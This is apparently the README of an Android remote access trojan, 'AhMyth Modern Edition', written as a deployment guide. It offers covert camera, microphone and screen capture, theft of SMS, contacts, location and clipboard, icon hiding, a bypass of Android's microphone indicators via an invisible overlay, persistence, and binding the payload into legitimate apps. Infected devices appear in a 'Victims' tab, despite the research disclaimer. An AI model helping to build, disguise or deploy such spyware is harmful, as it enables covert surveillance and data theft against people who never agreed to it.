# AhMyth Android RAT - Modern Edition

**Advanced Remote Administration Tool for Android Security Research**

[![Version](https://img.shields.io/badge/version-2.6-blue.svg)](https://github.com/syrex1013/AhMyth)
[![Android](https://img.shields.io/badge/Android-5.0%20--%2014%2B-green.svg)](https://developer.android.com/about/dashboards)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)]()
[![License](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)

---

## ⚠️ Legal Disclaimer

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY.**

The authors and contributors of AhMyth are not responsible for any misuse of this software. Using this tool on devices you do not own or have explicit permission to test is **illegal** and punishable by law. By downloading or using this software, you agree to take full responsibility for your actions.

---

## 📖 Overview

AhMyth is a powerful, open-source Remote Administration Tool (RAT) designed for controlling Android devices. This "Modern Edition" has been significantly overhauled to support the latest Android security standards (Android 10, 11, 12, 13, and 14), featuring advanced stealth capabilities, robust connection handling, and a suite of new forensic features.

---

## 🚀 Key Highlights

*   **Modern Android Support:** Fully compatible with Android 10 through Android 14+, bypassing modern background restrictions.
*   **Stealth Mode 2.0:** Utilizes a 1x1 pixel transparent overlay service to maintain foreground priority without alerting the user, allowing camera and microphone usage even when the app is "closed".
*   **Robust Connectivity:** Upgraded to the latest `socket.io` for stable, persistent connections that automatically recover.
*   **One-Click Deployment:** New GUI features to automatically build, install, grant permissions, and run the payload on connected devices.

---

## ✨ Features

### 📷 Surveillance & Streaming
*   **Camera Control:** Capture photos from front/back cameras.
    *   *New:* Auto-bypass for background restrictions using foreground service overlay.
    *   *New:* Fallback to screen capture if camera policy is strict (MDM).
*   **Live Microphone:** Stream real-time audio from the device.
    *   *New:* Recording capability with local file saving.
*   **Screen Mirroring:** View the device screen in real-time.
    *   *New:* Optimized framerate and touch input control.

### 🕵️ Forensics & Data Extraction
*   **File Manager:** Full filesystem access (Download/Upload/Delete).
*   **SMS Manager:** Read inbox/sent messages and send new SMS.
*   **Call Logs:** Retrieve complete call history.
*   **Contacts:** Export full contact list.
*   **Location Tracking:** precise GPS/Network location tracking.
*   **Browser History:** Extract history and bookmarks.
*   **Accounts:** List logged-in accounts (Google, WhatsApp, etc.).
*   **Clipboard:** Monitor and capture clipboard content.

### 🛡️ Stealth & Persistence
*   **App Hiding:** Option to hide app icon from the launcher.
*   **Service Persistence:** Auto-restart on boot and crash.
*   **Background Operation:** Runs as a foreground service with a "silent" notification (configurable) to prevent system killing.
*   **Permission Management:** 
    *   *New:* Auto-retry logic when permissions are granted.
    *   *New:* Smart dialog handling (temporarily visible for user grant, then invisible).

### 🛠️ Builder & Utility
*   **APK Builder:** customizable payload generator.
*   **Automated Install:** "Install & Run" button to deploy via ADB instantly.
*   **Permission Script:** Generates batch/shell scripts to auto-grant permissions via ADB.
*   **Connection Logs:** Detailed SQLite-backed logs of all operations.

---

## 📱 Android Compatibility

| Version | Status | Notes |
| :--- | :--- | :--- |
| **Android 5 - 9** | ✅ Fully Supported | Legacy camera API used. |
| **Android 10 (Q)** | ✅ Fully Supported | Scoped storage handled. |
| **Android 11 (R)** | ✅ Fully Supported | Background location & overlay handling. |
| **Android 12 (S)** | ✅ Fully Supported | Microphone indicators bypassed via overlay. |
| **Android 13 (T)** | ✅ Fully Supported | Notification permission handling. |
| **Android 14 (U)** | ✅ Fully Supported | Foreground service type requirements met. |

---

## 📦 Installation

### Prerequisites
*   **Java 11** (Required for APK building/signing)
*   **Node.js** or **Bun** (Bun is recommended for performance)
*   **ADB** (Android Debug Bridge) added to system PATH

### 1. Server Setup
```bash
git clone https://github.com/syrex1013/AhMyth.git
cd AhMyth/AhMyth-Server

# Install dependencies (using bun)
bun install

# OR using npm
# npm install
```

### 2. Running the Server
```bash
# Start the Electron GUI
bun start

# OR using npm
# npm start
```

---

## 🎮 Usage Guide

### Building a Payload
1.  Open the **APK Builder** tab in the GUI.
2.  Enter your **Public IP** (or Local IP for LAN testing) and **Port** (default: 1234).
3.  Select desired **permissions** and **stealth options**.
4.  Click **Build APK**.
5.  *Optional:* Click **Bind APK** to merge the payload with a legitimate app (e.g., a game).

### Deploying to Device
*   **Manual:** Transfer the built `.apk` from `AhMyth/AhMyth-Server/app/Factory/Output` to the target device and install.
*   **Automatic (ADB):** Connect device via USB (USB Debugging must be ON).
    *   Click **Install & Run** in the Builder tab.
    *   This will install the APK, grant all permissions (if possible via ADB), and start the app.

### Monitoring
1.  Go to the **Victims** tab.
2.  Once a device connects, it will appear in the list with country flag and status.
3.  Click "Open Lab" to access the control panel for that device.

---

## ✅ Recent Changelog (v2.6)

*   **Fixed:** `Socket.IO` upgraded to latest version for reliable connectivity.
*   **Fixed:** "App invisible but blocking screen" issue resolved using `FLAG_NOT_TOUCHABLE` and 1x1 pixel overlay.
*   **Added:** **Bun** runtime support for faster server operations.
*   **Added:** **SQLite** database integration for persistent logging.
*   **Added:** **Install & Run** / **Uninstall** buttons in GUI for rapid testing.
*   **Added:** Comprehensive automated test suite (`run-enhanced-test.js`).
*   **Improved:** Permission request logic - dialogs now correctly appear over the invisible activity.
*   **Improved:** Camera stability - delays added to ensure Activity is foregrounded before capture.
*   **Improved:** UI feedback - "Permission Granted" events now auto-trigger the pending action (e.g., stream starts immediately after allow).

---

## 🤝 Contributing

Contributions are welcome! Please fork the repository and create a pull request with your changes. Ensure you have tested your changes across different Android versions if possible.

---

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
